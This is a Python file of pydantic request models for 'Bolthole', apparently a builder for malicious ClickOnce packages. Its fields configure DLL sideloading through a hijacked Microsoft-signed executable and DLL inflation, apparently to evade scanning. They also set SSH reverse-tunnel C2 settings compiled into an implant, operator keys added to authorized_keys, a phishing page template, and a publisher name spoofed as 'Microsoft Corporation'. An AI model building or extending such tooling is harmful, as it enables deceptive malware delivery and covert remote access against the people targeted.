"""
Models for Bolthole build requests
"""

import re
from pydantic import BaseModel, Field, field_validator


class BoltholePayload(BaseModel):
    """Model describing incoming POST request for a Bolthole build"""
    # Section A — ClickOnce packaging
    name: str           # ClickOnce app name
    sideload: str       # which Microsoft-signed EXE to hijack
    provider_url: str = ""  # HTTPS URL for deploymentProvider in .application (optional)
    version: str        # app version string (e.g. "1.0.0.0")
    inflate: int        # MB to inflate DLL (0–500)
    files_prefix: str = Field(default="bolt", validate_default=True)  # prefix for bolt* filenames in the package (e.g. "shadow" → ShadowFiles/)
    # Section B — Bolthole SSH tunnel (values compiled into the DLL)
    ssh_host: str       # C2 FQDN or IP
    ssh_user: str       # SSH username on C2
    ports: str          # comma-separated port scan order (e.g. "443,80,22,31337")
    tunnel_port_range: str  # range of reverse tunnel ports to try, e.g. "31332-31345" or "31332"
    socks_port: int = 1080  # reserved; not used by current implant
    startup_delay: int  # seconds to sleep before starting boltcon (default 5)
    reconnect_delay: int  # seconds to sleep between reconnect attempts (default 30)
    operator_pubkey: str = ""  # extra operator public keys appended to authorized_keys
    phish_template: str = "it_portal"        # which phish page template to use
    publisher: str = "Microsoft Corporation" # Publisher shown in UAC / install dialog
    description: str = ""                    # Product description in manifest
    icon: str = ""                           # Base64-encoded .ico to replace template icon

    @field_validator("files_prefix")
    @classmethod
    def validate_files_prefix(cls, v: str) -> str:
        if not re.match(r'^[a-z][a-z0-9]{2,15}$', v):
            raise ValueError("files_prefix must be 3–16 lowercase alphanumeric characters starting with a letter")
        return v


class BoltholeC2ConfigRequest(BaseModel):
    """POST body for saving the global C2 config and optionally rotating the keypair."""
    ssh_host: str
    ssh_user: str
    ports: str = "443,80,22,31337"
    tunnel_port_range: str = "31332-31345"
    socks_port: int = 1080
    startup_delay: int = 5
    reconnect_delay: int = 30
    regenerate_keypair: bool = False
